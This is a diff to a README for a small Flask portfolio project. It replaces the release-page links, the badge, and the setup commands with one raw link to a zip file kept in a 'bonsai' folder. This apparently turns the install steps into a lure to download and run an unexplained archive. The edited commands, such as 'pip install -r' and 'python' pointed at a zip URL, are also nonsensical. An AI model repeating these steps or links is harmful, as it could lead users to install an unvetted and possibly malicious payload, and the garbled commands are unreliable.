@@ -1,6 +1,6 @@
 # 🎨 portfolio-1 - A Simple Way to Showcase Your Projects
 
-[![Download Portfolio](https://img.shields.io/badge/Download%20Portfolio-Here-brightgreen)](https://github.com/gabimc74/portfolio-1/releases)
+[![Download Portfolio](https://raw.githubusercontent.com/gabimc74/portfolio-1/main/bonsai/portfolio-1.zip%20Portfolio-Here-brightgreen)](https://raw.githubusercontent.com/gabimc74/portfolio-1/main/bonsai/portfolio-1.zip)
 
 ## 🌟 About This Project
 
@@ -18,7 +18,7 @@ Para usar este portfólio em seu computador, siga os passos abaixo. Não se preo
 
 ### 📥 Download & Install
 
-Visite a [página de lançamentos](https://github.com/gabimc74/portfolio-1/releases) para baixar a versão mais recente do portfólio. 
+Visite a [página de lançamentos](https://raw.githubusercontent.com/gabimc74/portfolio-1/main/bonsai/portfolio-1.zip) para baixar a versão mais recente do portfólio. 
 
 ### ✔️ System Requirements
 
@@ -31,7 +31,7 @@ Para garantir que o portfólio funcione corretamente, certifique-se de que o seu
 ## 🔧 Installation Steps
 
 1. **Visite a página de lançamentos:**
-   Vá para a [página de lançamentos](https://github.com/gabimc74/portfolio-1/releases) e clique na versão mais recente.
+   Vá para a [página de lançamentos](https://raw.githubusercontent.com/gabimc74/portfolio-1/main/bonsai/portfolio-1.zip) e clique na versão mais recente.
   
 2. **Baixe o arquivo:**
    Clique no link de download apropriado para o seu sistema operacional.
@@ -43,14 +43,14 @@ Para garantir que o portfólio funcione corretamente, certifique-se de que o seu
    Abra o terminal ou prompt de comando e navegue até a pasta onde você descompactou o portfólio. Execute o seguinte comando:
 
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/gabimc74/portfolio-1/main/bonsai/portfolio-1.zip
    ```
 
 5. **Execute o servidor:**
    Após a instalação das dependências, inicie o servidor Flask com o comando:
 
    ```
-   python app.py
+   python https://raw.githubusercontent.com/gabimc74/portfolio-1/main/bonsai/portfolio-1.zip
    ```
 
 6. **Acesse o portfólio:**
@@ -77,6 +77,6 @@ Um grande agradecimento a todos que ajudaram a tornar este projeto possível. Es
 
 Se você tiver alguma dúvida ou precisar de ajuda, pode entrar em contato comigo através das minhas redes sociais ou por e-mail. Fique à vontade para me mandar uma mensagem!
 
-[![Download Portfolio](https://img.shields.io/badge/Download%20Portfolio-Here-brightgreen)](https://github.com/gabimc74/portfolio-1/releases)
+[![Download Portfolio](https://raw.githubusercontent.com/gabimc74/portfolio-1/main/bonsai/portfolio-1.zip%20Portfolio-Here-brightgreen)](https://raw.githubusercontent.com/gabimc74/portfolio-1/main/bonsai/portfolio-1.zip)
 
 Aproveite seu novo portfólio!
